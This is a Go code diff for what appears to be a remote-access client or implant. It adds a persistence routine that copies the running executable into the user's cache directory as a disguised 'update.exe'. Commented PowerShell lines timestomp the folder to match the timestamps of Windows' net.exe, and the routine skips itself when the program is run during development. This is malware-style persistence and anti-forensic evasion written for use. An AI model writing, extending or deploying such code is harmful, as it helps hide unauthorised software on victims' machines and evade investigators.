@@ -8,6 +8,8 @@ import (
 	"os"
 	"os/exec"
 	"os/signal"
+	"path"
+	"strings"
 	"syscall"
 	"time"
 	"yotamura/common"
@@ -79,8 +81,30 @@ func reconnect() {
 	go main()
 }
 
+func persist() {
+	ex, err := os.Executable()
+	if err != nil {
+		panic(err)
+	}
+	fmt.Println(ex)
+	if strings.Contains(ex, "go-build") {
+		//this will stop this function from doing anything else
+		//if this program is run with "go run"
+		return
+	}
+
+	//(Get-Item C:\Users\meow\AppData\Local\cache).CreationTime = (Get-Item C:\Windows\System32\net.exe).CreationTime
+	//(Get-Item C:\Users\meow\AppData\Local\cache).LastWriteTime = (Get-Item C:\Windows\System32\net.exe).LastWriteTime
+
+	userCacheDir, _ := os.UserCacheDir()
+	programDir := path.Join(userCacheDir, "cache")
+	common.CopyFile(ex, path.Join(programDir, "update.exe"))
+}
+
 func main() {
 	flag.Parse()
+
+	persist()
 
 	interrupt := make(chan os.Signal, 1)
 	signal.Notify(interrupt, os.Interrupt)
